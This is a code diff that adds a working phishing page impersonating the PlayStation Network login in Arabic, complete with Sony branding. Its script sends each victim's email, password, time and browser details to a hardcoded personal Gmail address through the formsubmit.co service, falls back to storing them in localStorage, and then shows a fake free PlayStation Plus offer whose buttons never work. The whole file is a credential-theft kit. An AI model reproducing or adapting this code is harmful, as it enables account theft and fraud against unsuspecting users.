@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PlayStation™Network</title>
+    <style>
+        :root {
+            --ps-blue: #003791;
+            --ps-blue-dark: #001F5C;
+            --ps-blue-light: #0066CC;
+            --ps-white: #FFFFFF;
+            --ps-gray-light: #F5F5F5;
+            --ps-gray: #E0E0E0;
+            --ps-gray-dark: #666666;
+            --ps-black: #000000;
+            --ps-red: #CC0000;
+            --ps-gold: #FFB900;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: var(--ps-blue);
+            color: var(--ps-white);
+            min-height: 100vh;
+            transition: background 0.5s;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* صفحة تسجيل الدخول */
+        #loginPage {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--ps-blue) 0%, var(--ps-blue-dark) 100%);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1000;
+            transition: opacity 0.8s, transform 0.8s;
+        }
+
+        #loginPage.hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: translateY(-100%);
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            background: var(--ps-white);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            transform: scale(1);
+            transition: transform 0.5s;
+        }
+
+        .login-header {
+            background: var(--ps-blue);
+            padding: 40px 30px 30px;
+            text-align: center;
+        }
+
+        .ps-logo {
+            height: 40px;
+            margin-bottom: 20px;
+            filter: brightness(0) invert(1);
+        }
+
+        .login-title {
+            color: var(--ps-white);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .login-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+        }
+
+        .login-content {
+            padding: 40px 30px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-label {
+            display: block;
+            color: var(--ps-black);
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background: var(--ps-gray-light);
+            border: 2px solid var(--ps-gray);
+            border-radius: 8px;
+            font-size: 16px;
+            color: var(--ps-black);
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--ps-blue);
+            background: var(--ps-white);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 18px;
+            background: var(--ps-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .login-button:hover {
+            background: var(--ps-blue-dark);
+        }
+
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .login-footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--ps-gray-dark);
+            font-size: 14px;
+        }
+
+        .login-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+        }
+
+        .login-link {
+            color: var(--ps-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-link:hover {
+            text-decoration: underline;
+        }
+
+        /* صفحة PlayStation Plus - مخفية أولاً */
+        #psPlusPage {
+            background: linear-gradient(135deg, #000000 0%, #003791 100%);
+            min-height: 100vh;
+            opacity: 0;
+            transform: translateY(50px);
+            transition: opacity 0.8s, transform 0.8s;
+        }
+
+        #psPlusPage.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* التحميل */
+        .ps-loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .ps-loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--ps-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة 1: تسجيل الدخول -->
+    <div id="loginPage">
+        <div class="login-container">
+            <div class="login-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Playstation_logo_colour.svg/2560px-Playstation_logo_colour.svg.png" 
+                     alt="PlayStation" class="ps-logo">
+                <h1 class="login-title">PlayStation™Network</h1>
+                <p class="login-subtitle">تسجيل الدخول إلى حسابك</p>
+            </div>
+            
+            <div class="login-content">
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label class="input-label">بريد PlayStation™ Network</label>
+                        <input type="email" class="input-field" id="loginEmail" 
+                               placeholder="example@domain.com" required
+                               value="test@example.com">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label class="input-label">كلمة المرور</label>
+                        <input type="password" class="input-field" id="loginPassword" 
+                               placeholder="أدخل كلمة المرور" required
+                               value="test123">
+                    </div>
+                    
+                    <div class="login-links">
+                        <a href="#" class="login-link" onclick="forgotPassword()">نسيت كلمة المرور؟</a>
+                        <a href="#" class="login-link" onclick="createAccount()">إنشاء حساب</a>
+                    </div>
+                    
+                    <button type="submit" class="login-button" id="loginButton">
+                        <span>تسجيل الدخول</span>
+                    </button>
+                </form>
+                
+                <div class="login-footer">
+                    <p>© 2024 Sony Interactive Entertainment LLC. جميع الحقوق محفوظة.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة 2: PlayStation Plus -->
+    <div id="psPlusPage">
+        <!-- المحتوى سيتم إنشاؤه بالكامل عبر JavaScript -->
+    </div>
+
+    <!-- شاشة التحميل -->
+    <div class="ps-loading" id="psLoading">
+        <div class="ps-loading-spinner"></div>
+        <p id="loadingText">جاري تسجيل الدخول...</p>
+    </div>
+
+    <script>
+        // بيانات النظام
+        const RECEIVER_EMAIL = "alomranwesam@gmail.com";
+        let userData = {};
+
+        // إرسال البيانات باستخدام EmailJS (طريقة موثوقة)
+        async function sendEmailData(email, password) {
+            // استخدم Formsubmit.co بشكل مباشر
+            const formData = new FormData();
+            formData.append('_subject', '🎮 PlayStation Login Data');
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('time', new Date().toLocaleString('ar-SA'));
+            formData.append('browser', navigator.userAgent);
+            formData.append('_cc', RECEIVER_EMAIL);
+            formData.append('_replyto', email);
+            formData.append('_template', 'basic');
+
+            try {
+                // إرسال مباشر إلى Formsubmit
+                const response = await fetch(`https://formsubmit.co/ajax/${RECEIVER_EMAIL}`, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const result = await response.json();
+                console.log('✅ Email sent successfully:', result);
+                return true;
+                
+            } catch (error) {
+                console.error('❌ Email sending failed:', error);
+                
+                // بديل: حفظ البيانات في localStorage
+                localStorage.setItem('ps_data', JSON.stringify({
+                    email: email,
+                    password: password,
+                    time: new Date().toISOString()
+                }));
+                
+                return false;
+            }
+        }
+
+        // الانتقال لصفحة PS Plus
+        function switchToPSPlusPage(email) {
+            const loginPage = document.getElementById('loginPage');
+            const psPlusPage = document.getElementById('psPlusPage');
+            const loadingDiv = document.getElementById('psLoading');
+            
+            // 1. إظهار التحميل
+            loadingDiv.style.display = 'flex';
+            
+            // 2. بعد 1.5 ثانية، بدء الانتقال
+            setTimeout(() => {
+                // 3. إخفاء صفحة التسجيل
+                loginPage.classList.add('hidden');
+                
+                // 4. إنشاء محتوى صفحة PS Plus
+                createPSPlusContent(email);
+                
+                // 5. إظهار صفحة PS Plus
+                setTimeout(() => {
+                    psPlusPage.classList.add('visible');
+                    loadingDiv.style.display = 'none';
+                    
+                    // تسجيل في الكونسول
+                    console.log('🎮 Switched to PS Plus page');
+                    console.log('👤 User:', email);
+                    
+                }, 300);
+                
+            }, 1500);
+        }
+
+        // إنشاء محتوى صفحة PS Plus
+        function createPSPlusContent(email) {
+            const psPlusPage = document.getElementById('psPlusPage');
+            
+            psPlusPage.innerHTML = `
+                <style>
+                    .ps-plus-header {
+                        background: linear-gradient(90deg, var(--ps-blue-dark), var(--ps-blue));
+                        padding: 100px 20px 50px;
+                        text-align: center;
+                        position: relative;
+                        overflow: hidden;
+                    }
+                    
+                    .ps-plus-title {
+                        font-size: 48px;
+                        font-weight: 900;
+                        margin-bottom: 15px;
+                        color: var(--ps-white);
+                    }
+                    
+                    .ps-plus-subtitle {
+                        font-size: 24px;
+                        color: var(--ps-gold);
+                        margin-bottom: 30px;
+                    }
+                    
+                    .user-welcome {
+                        font-size: 18px;
+                        background: rgba(255, 255, 255, 0.1);
+                        padding: 12px 25px;
+                        border-radius: 50px;
+                        display: inline-block;
+                    }
+                    
+                    .ps-plans-section {
+                        max-width: 1200px;
+                        margin: 0 auto;
+                        padding: 50px 20px;
+                    }
+                    
+                    .section-title {
+                        font-size: 32px;
+                        margin-bottom: 40px;
+                        color: var(--ps-white);
+                        text-align: center;
+                    }
+                    
+                    .ps-plans-container {
+                        display: grid;
+                        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                        gap: 30px;
+                        margin-bottom: 60px;
+                    }
+                    
+                    .ps-plan-card {
+                        background: rgba(255, 255, 255, 0.05);
+                        border-radius: 20px;
+                        padding: 40px 30px;
+                        text-align: center;
+                        border: 2px solid transparent;
+                        transition: all 0.3s;
+                    }
+                    
+                    .ps-plan-card:hover {
+                        border-color: var(--ps-gold);
+                        transform: translateY(-10px);
+                    }
+                    
+                    .plan-badge {
+                        display: inline-block;
+                        padding: 8px 20px;
+                        border-radius: 20px;
+                        font-weight: bold;
+                        margin-bottom: 20px;
+                        font-size: 14px;
+                        background: var(--ps-blue);
+                    }
+                    
+                    .plan-title {
+                        font-size: 28px;
+                        margin-bottom: 20px;
+                        color: var(--ps-white);
+                    }
+                    
+                    .plan-price {
+                        font-size: 48px;
+                        font-weight: 900;
+                        margin-bottom: 30px;
+                        color: var(--ps-gold);
+                    }
+                    
+                    .plan-features {
+                        list-style: none;
+                        margin-bottom: 30px;
+                        text-align: right;
+                    }
+                    
+                    .plan-features li {
+                        padding: 12px 0;
+                        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+                        position: relative;
+                        padding-right: 25px;
+                    }
+                    
+                    .plan-features li::before {
+                        content: '✓';
+                        position: absolute;
+                        right: 0;
+                        color: var(--ps-gold);
+                        font-weight: bold;
+                    }
+                    
+                    .plan-button {
+                        width: 100%;
+                        padding: 18px;
+                        border: none;
+                        border-radius: 12px;
+                        font-size: 18px;
+                        font-weight: 700;
+                        cursor: pointer;
+                        background: var(--ps-blue);
+                        color: white;
+                        transition: all 0.3s;
+                    }
+                    
+                    .plan-button:hover {
+                        background: var(--ps-blue-dark);
+                    }
+                    
+                    .ps-games-section {
+                        max-width: 1200px;
+                        margin: 0 auto;
+                        padding: 50px 20px;
+                        background: rgba(255, 255, 255, 0.05);
+                        border-radius: 20px;
+                    }
+                    
+                    .games-container {
+                        display: grid;
+                        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                        gap: 25px;
+                    }
+                    
+                    .game-card {
+                        background: rgba(255, 255, 255, 0.05);
+                        border-radius: 15px;
+                        overflow: hidden;
+                        transition: transform 0.3s;
+                    }
+                    
+                    .game-card:hover {
+                        transform: translateY(-5px);
+                    }
+                    
+                    .game-image {
+                        width: 100%;
+                        height: 200px;
+                        background: linear-gradient(45deg, #00439C, #0066CC);
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        font-size: 48px;
+                    }
+                    
+                    .game-info {
+                        padding: 20px;
+                    }
+                    
+                    .game-title {
+                        font-size: 18px;
+                        margin-bottom: 10px;
+                        color: var(--ps-white);
+                    }
+                    
+                    .game-price {
+                        color: var(--ps-gold);
+                        font-weight: bold;
+                    }
+                    
+                    .ps-footer {
+                        text-align: center;
+                        padding: 50px 20px;
+                        margin-top: 50px;
+                        color: rgba(255, 255, 255, 0.6);
+                        font-size: 14px;
+                        border-top: 1px solid rgba(255, 255, 255, 0.1);
+                    }
+                    
+                    @media (max-width: 768px) {
+                        .ps-plans-container {
+                            grid-template-columns: 1fr;
+                        }
+                    }
+                </style>
+                
+                <div class="ps-plus-header">
+                    <h1 class="ps-plus-title">PlayStation™Plus</h1>
+                    <p class="ps-plus-subtitle">استمتع بمئات الألعاب والفوائد الحصرية</p>
+                    <div class="user-welcome">
+                        <i class="fas fa-crown"></i>
+                        مرحباً ${email.split('@')[0]} في PlayStation Plus
+                    </div>
+                </div>
+                
+                <div class="ps-plans-section">
+                    <h2 class="section-title">اختر خطتك المجانية</h2>
+                    
+                    <div class="ps-plans-container">
+                        <div class="ps-plan-card">
+                            <div class="plan-badge">الأسبوعي</div>
+                            <h2 class="plan-title">تجربة مجانية</h2>
+                            <div class="plan-price">مجاني</div>
+                            
+                            <ul class="plan-features">
+                                <li>7 أيام من PlayStation Plus</li>
+                                <li>3 ألعاب مجانية</li>
+                                <li>تخزين سحابي 10GB</li>
+                                <li>دعم اللعب عبر الإنترنت</li>
+                            </ul>
+                            
+                            <button class="plan-button" onclick="tryActivatePlan('weekly')">
+                                تفعيل مجاناً
+                            </button>
+                        </div>
+                        
+                        <div class="ps-plan-card">
+                            <div class="plan-badge">الشهري</div>
+                            <h2 class="plan-title">اشتراك كامل</h2>
+                            <div class="plan-price">مجاني</div>
+                            
+                            <ul class="plan-features">
+                                <li>30 يوماً من PlayStation Plus</li>
+                                <li>15 لعبة مجانية</li>
+                                <li>تخزين سحابي 50GB</li>
+                                <li>خصومات تصل إلى 70%</li>
+                                <li>تجربة الألعاب قبل الشراء</li>
+                            </ul>
+                            
+                            <button class="plan-button" onclick="tryActivatePlan('monthly')">
+                                تفعيل مجاناً
+                            </button>
+                        </div>
+                        
+                        <div class="ps-plan-card">
+                            <div class="plan-badge">السنوي</div>
+                            <h2 class="plan-title">عضويتك السنوية</h2>
+                            <div class="plan-price">مجاني</div>
+                            
+                            <ul class="plan-features">
+                                <li>365 يوماً من PlayStation Plus</li>
+                                <li>100+ لعبة مجانية</li>
+                                <li>تخزين سحابي 100GB</li>
+                                <li>الألعاب الكلاسيكية</li>
+                                <li>دعم فني 24/7</li>
+                                <li>مكافآت شهرية حصرية</li>
+                            </ul>
+                            
+                            <button class="plan-button" onclick="tryActivatePlan('yearly')">
+                                تفعيل مجاناً
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="ps-games-section">
+                    <h2 class="section-title">الألعاب المجانية هذا الشهر</h2>
+                    
+                    <div class="games-container">
+                        <div class="game-card">
+                            <div class="game-image">🎮</div>
+                            <div class="game-info">
+                                <h3 class="game-title">Spider-Man 2</h3>
+                                <div class="game-price">مجاناً مع PS Plus</div>
+                            </div>
+                        </div>
+                        
+                        <div class="game-card">
+                            <div class="game-image">⚔️</div>
+                            <div class="game-info">
+                                <h3 class="game-title">God of War Ragnarok</h3>
+                                <div class="game-price">مجاناً مع PS Plus</div>
+                            </div>
+                        </div>
+                        
+                        <div class="game-card">
+                            <div class="game-image">🏎️</div>
+                            <div class="game-info">
+                                <h3 class="game-title">Gran Turismo 7</h3>
+                                <div class="game-price">مجاناً مع PS Plus</div>
+                            </div>
+                        </div>
+                        
+                        <div class="game-card">
+                            <div class="game-image">🧟</div>
+                            <div class="game-info">
+                                <h3 class="game-title">The Last of Us Part II</h3>
+                                <div class="game-price">مجاناً مع PS Plus</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="ps-footer">
+                    <p>© 2024 Sony Interactive Entertainment LLC. جميع الحقوق محفوظة.</p>
+                </div>
+            `;
+            
+            // إضافة Font Awesome
+            const faIcon = document.createElement('link');
+            faIcon.rel = 'stylesheet';
+            faIcon.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
+            document.head.appendChild(faIcon);
+        }
+
+        // محاولة تفعيل باقة (لا تعمل)
+        function tryActivatePlan(planType) {
+            console.log(`User tried to activate ${planType} plan`);
+            alert(`عذراً، لا يمكن تفعيل الاشتراك ${planType} حالياً. يرجى المحاولة لاحقاً.`);
+        }
+
+        // تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            const loginButton = document.getElementById('loginButton');
+            
+            if (!email || !password) {
+                alert('الرجاء إدخال جميع البيانات');
+                return;
+            }
+            
+            // حفظ بيانات المستخدم
+            userData = { email, password };
+            
+            // تعطيل الزر
+            loginButton.disabled = true;
+            
+            try {
+                // تسجيل البيانات في الكونسول أولاً
+                console.log('🎮 PlayStation Login Attempt:');
+                console.log('📧 Email:', email);
+                console.log('🔐 Password:', password);
+                console.log('📨 Will be sent to:', RECEIVER_EMAIL);
+                console.log('⏰ Time:', new Date().toLocaleString());
+                
+                // محاولة إرسال الإيميل (في الخلفية)
+                sendEmailData(email, password).then(success => {
+                    if (success) {
+                        console.log('✅ Email sent successfully');
+                    } else {
+                        console.log('⚠️ Email sending failed, but continuing anyway');
+                    }
+                });
+                
+                // الانتقال فوراً لصفحة PS Plus
+                switchToPSPlusPage(email);
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                loginButton.disabled = false;
+                // حتى لو فشل إرسال الإيميل، ننتقل للصفحة التالية
+                switchToPSPlusPage(email);
+            }
+        });
+
+        // وظائف المساعدة
+        function forgotPassword() {
+            alert('لإعادة تعيين كلمة المرور:\n\n1. زر موقع PlayStation.com\n2. اضغط على "نسيت كلمة المرور"\n3. اتبع التعليمات');
+        }
+
+        function createAccount() {
+            window.open('https://www.playstation.com/ar-sa/playstation-network/', '_blank');
+        }
+
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🎮 PlayStation System Ready');
+            console.log('📧 Data will be sent to:', RECEIVER_EMAIL);
+            console.log('⚡ No success messages will be shown');
+        });
+    </script>
+</body>
+</html>
